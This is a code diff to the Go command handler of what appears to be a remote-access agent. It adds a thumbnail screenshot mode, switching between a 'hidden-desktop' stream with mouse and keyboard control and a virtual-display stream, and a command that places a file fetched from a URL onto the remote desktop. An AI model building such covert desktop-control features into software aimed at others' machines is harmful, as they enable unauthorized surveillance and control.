@@ -607,17 +607,20 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "screenshot":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		allDisplays := false
+		dashboardThumbnail := false
 		if payload != nil {
+			mode, _ := payload["mode"].(string)
+			dashboardThumbnail = mode == "thumbnail"
 			if v, ok := payload["allDisplays"].(bool); ok && v {
 				allDisplays = true
-			} else if mode, ok := payload["mode"].(string); ok && mode == "notification" {
+			} else if mode == "notification" || mode == "thumbnail" {
 				allDisplays = true
 			}
 		}
 		if goruntime.GOOS == "windows" {
 			allDisplays = true
 		}
-		return HandleScreenshot(ctx, env, cmdID, allDisplays)
+		return HandleScreenshot(ctx, env, cmdID, allDisplays, dashboardThumbnail)
 	case "plugin_load":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		if payload == nil {
@@ -911,7 +914,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			display = 0
 		}
 		goSafe("desktop encoder capability probe", env.Cancel, func() {
-			caps := capture.ProbeDesktopEncoderCapabilities(display)
+			caps := capture.ProbeDesktopEncoderCapabilities(ctx, display)
 			profiles := make([]wire.DesktopEncoderProfile, 0, len(caps.Profiles))
 			for _, profile := range caps.Profiles {
 				profiles = append(profiles, wire.DesktopEncoderProfile{
@@ -1149,6 +1152,22 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		capture.RequestDesktopRecoveryAfterBackstageStart()
 		if VirtualMode {
+			// The hidden-desktop and virtual-display implementations share the
+			// backstage encoder, frame history, and fallback capture caches. Stop
+			// the other implementation before switching; ordinary remote desktop
+			// remains independent and continues running.
+			env.BackstageMu.Lock()
+			if env.BackstageCancel != nil {
+				env.BackstageCancel()
+				waitStreamStop(env.BackstageDone, "backstage")
+				env.BackstageCancel = nil
+				env.BackstageDone = nil
+			}
+			env.BackstageMouseControl = false
+			env.BackstageKeyboardControl = false
+			env.BackstageCursorCapture = false
+			clearbackstageInputQueue()
+			env.BackstageMu.Unlock()
 			env.VirtualMu.Lock()
 			if env.VirtualCancel != nil {
 				env.VirtualCancel()
@@ -1177,6 +1196,12 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
+		env.VirtualMu.Lock()
+		if env.VirtualCancel != nil {
+			log.Printf("hidden: stopping virtual stream before starting backstage desktop")
+			stopVirtualStreamLocked(env)
+		}
+		env.VirtualMu.Unlock()
 		env.BackstageMu.Lock()
 		if env.BackstageCancel != nil {
 			env.BackstageCancel()
@@ -2732,6 +2757,20 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		})
 		return nil
+	case "file_upload_desktop":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		fileName, _ := payload["fileName"].(string)
+		sourceURL, _ := payload["url"].(string)
+		total := payloadNumberToInt64(payload["total"])
+		_, hasX := payload["x"]
+		_, hasY := payload["y"]
+		x := int32(payloadNumberToInt64(payload["x"]))
+		y := int32(payloadNumberToInt64(payload["y"]))
+		display := env.SelectedDisplay
+		if _, ok := payload["display"]; ok {
+			display = int(payloadNumberToInt64(payload["display"]))
+		}
+		return HandleFileUploadDesktop(ctx, env, cmdID, fileName, sourceURL, total, display, x, y, hasX && hasY)
 	case "file_delete":
 		path, _ := envelopePayloadString(envelope, "path")
 		return HandleFileDelete(ctx, env, cmdID, path)
